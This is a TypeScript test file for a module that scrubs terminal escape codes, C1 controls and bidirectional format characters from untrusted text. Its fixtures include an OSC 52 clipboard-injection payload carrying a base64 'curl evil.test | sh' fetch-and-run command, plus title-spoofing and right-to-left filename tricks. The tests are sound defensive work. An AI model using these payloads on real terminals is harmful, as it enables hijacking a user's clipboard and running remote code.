/**
 * `clip.ts`: somebody else's words, made safe for the terminal of the person running the command.
 *
 * THE CASES ARE A REAL ATTACK'S BYTES, NOT INVENTED ONES. A `set_var` answer was measured carrying
 * OSC 52 (a clipboard write of `curl evil.test | sh`), OSC 0 (a window title) and CR plus CSI 2K (erase the line) all the
 * way to `automations show`'s output. The eight-bit spellings are here because the copies this module replaced in
 * `brief.ts` and `session.ts` stopped at U+001F and let U+009B and U+009D through, measured by running this file against
 * their regex before the module existed.
 */

import { test } from 'node:test';
import assert from 'node:assert/strict';

import { clip, oneLine, printable } from '../src/clip.ts';

const HOSTILE = 'Invoice 7\u001b]52;c;Y3VybCBldmlsLnRlc3QgfCBzaA==\u0007\u001b]0;BrainDog: all clear\u0007\r\u001b[2K';
const SHOWN = 'Invoice 7 ]52;c;Y3VybCBldmlsLnRlc3QgfCBzaA== ]0;BrainDog: all clear [2K';

/** Every control character a printed line could carry, C0, DEL and C1 alike. */
const CONTROL = /[\u0000-\u001f\u007f-\u009f]/;

test('oneLine: the hostile row loses every ESC, BEL and CR, and keeps every printable character where it was', () => {
  assert.equal(oneLine(HOSTILE), SHOWN);
  assert.equal(CONTROL.test(oneLine(HOSTILE)), false);
});

test('oneLine: the eight-bit CSI and OSC, and DEL, go the same way as the seven-bit ones', () => {
  assert.equal(oneLine('acme\u009b2K'), 'acme 2K');
  assert.equal(oneLine('acme\u009d0;title\u009c'), 'acme 0;title');
  assert.equal(oneLine('a\u007fb'), 'a b');
});

test('oneLine: a note written over several lines reads as one, and words that were never hostile are left alone', () => {
  assert.equal(oneLine('  First line.\n\tSecond line.\r\n'), 'First line. Second line.');
  /* ACCENTS AND ARABIC ARE ABOVE U+009F, so a name written in either survives the scrub byte for byte. */
  assert.equal(oneLine('Café Sanad مرحبا'), 'Café Sanad مرحبا');
});

test('clip: cuts after the scrub, so an escape sequence cannot spend the characters a person was meant to read', () => {
  assert.equal(clip(HOSTILE, 200), SHOWN);
  assert.equal(clip(HOSTILE, 12), 'Invoice 7...');
  assert.equal(clip('short', 12), 'short');
});

test('printable: every string at any depth is one clean line, and numbers, booleans and nulls are kept as they are', () => {
  const kept = { name: HOSTILE, version: 3, enabled: false, next: null, runs: [{ say: HOSTILE, steps: [{ answer: 'a\nb' }] }], reads: [HOSTILE] };
  const before = structuredClone(kept);
  assert.deepEqual(printable(kept), { name: SHOWN, version: 3, enabled: false, next: null, runs: [{ say: SHOWN, steps: [{ answer: 'a b' }] }], reads: [SHOWN] });
  /* A COPY, NEVER THE VALUE ITSELF: the same object is what `--json` hands an agent, bytes and all. */
  assert.deepEqual(kept, before);
});

/*
 * FORMAT CHARACTERS GO TOO, NOT ONLY CONTROLS. Every control character (Unicode's Cc) was gone and no format
 * character (Cf) was: a probe printed PASSES for U+202E, the isolates, U+200F, U+061C, U+200B, U+2060, U+00AD, a tag character
 * and U+FFF9, and this file run against the old class failed on each. None of them tells a terminal to do anything, but
 * a terminal that lays text out both ways (VTE, Konsole, mlterm) draws `invoice U+202E fdp.exe` as `invoiceexe.pdf`.
 */
const u = (n: number): string => String.fromCodePoint(n);
const FORMAT = [0x061c, 0x200b, 0x200e, 0x200f, 0x202a, 0x202b, 0x202c, 0x202d, 0x202e, 0x2060, 0x2066, 0x2067, 0x2068, 0x2069, 0x00ad, 0xfff9, 0xfffa, 0xfffb, 0xe0000, 0xe0041, 0xe007f];

test('oneLine: every bidirectional control and invisible character a terminal can be tricked by is taken out, and the word is left whole', () => {
  for (const n of FORMAT) {
    const hex = n.toString(16).toUpperCase().padStart(4, '0');
    assert.equal(oneLine(`co${u(n)}op`), 'coop', `U+${hex} got through`);
  }
  assert.equal(oneLine(`invoice${u(0x202e)}fdp.exe`), 'invoicefdp.exe');
});

test('oneLine: the zero width joiner stays, because a family or a rainbow flag is drawn from it', () => {
  const family = `\u{1f468}${u(0x200d)}\u{1f469}${u(0x200d)}\u{1f467}`;
  assert.equal(oneLine(`The ${family} row`), `The ${family} row`);
});

/*
 * A PROBE SAW `clip cuts a surrogate pair: true`, and it was real: `slice` counts UTF-16 units, so an emoji
 * straddling the cut left its high half on the line, which a terminal draws as a replacement box or, in some, an error.
 */
test('clip: never cuts a character in half, so an emoji at the cut is kept whole or left out whole', () => {
  const cut = clip(`${'x'.repeat(6)}\u{1f600}${'y'.repeat(10)}`, 10);
  assert.equal(/[\ud800-\udbff](?![\udc00-\udfff])|(?<![\ud800-\udbff])[\udc00-\udfff]/u.test(cut), false, JSON.stringify(cut));
  assert.equal(cut, `${'x'.repeat(6)}\u{1f600}...`);
  assert.equal(clip('\u{1f600}'.repeat(5), 5), '\u{1f600}'.repeat(5));
});

/*
 * A KEY IS SOMEBODY ELSE'S WORDS TOO. `automations show` hands `printable` the whole answer, a rule's `body` among it,
 * and a `script` step's `input` is a map whose names the lint does not look at. No line prints a key today; the whole
 * value is scrubbed so that the next line to print one does not have to remember where it came from.
 */
test('printable: an object key holding ESC is made one clean line as well as its value', () => {
  const keyed = printable({ [`k\u001b]0;owned\u0007`]: 'v', plain: { [`in${u(0x202e)}ner`]: 1 } });
  assert.deepEqual(keyed, { 'k ]0;owned': 'v', plain: { inner: 1 } });
});
